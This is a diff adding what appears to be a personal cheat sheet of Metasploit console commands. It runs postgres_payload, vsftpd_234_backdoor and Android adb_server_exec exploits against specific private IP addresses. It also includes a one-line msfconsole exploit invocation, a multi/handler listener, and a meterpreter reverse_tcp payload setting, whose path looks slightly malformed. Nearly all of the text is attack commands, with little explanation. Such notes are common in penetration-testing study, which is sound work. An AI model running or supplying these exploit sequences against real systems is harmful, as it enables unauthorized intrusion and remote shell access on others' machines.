@@ -1,0 +1,56 @@
+service postgresql start
+msfconsole
+
+
+search postgres
+use exploit/linux/postgres/postgres_payload
+show options
+set RHOSTS 10.3.56.3
+exploit
+ help
+------------------------------------        sessions -l  db_status
+
+
+
+
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOST 192.168.88.1 192.168.88.254
+show options
+show exploits
+exploit
+msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor;set rhost 192.168.13.1;exploit"
+
+
+msf exploit(vsftpd_234_backdoor) > show targets
+    ...targets...
+msf exploit(vsftpd_234_backdoor) > set TARGET < target-id >
+msf exploit(vsftpd_234_backdoor) > show options
+    ...show and set options...
+msf exploit(vsftpd_234_backdoor) > exploit
+
+https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/
+--------------------
+db_status
+
+msfdb
+msfdb init
+msfdb start
+---------------------------
+use exploit/multi/handler
+
+set LHOST 192.168.10.1
+==========================================
+
+search portscan
+show options
+==========================================================
+                android
+
+exploit/android/adb/adb_server_exec
+show targets
+set target 1
+show Payload
+set Payload /linux/86/meterpreter/reverse_tcp
+
+
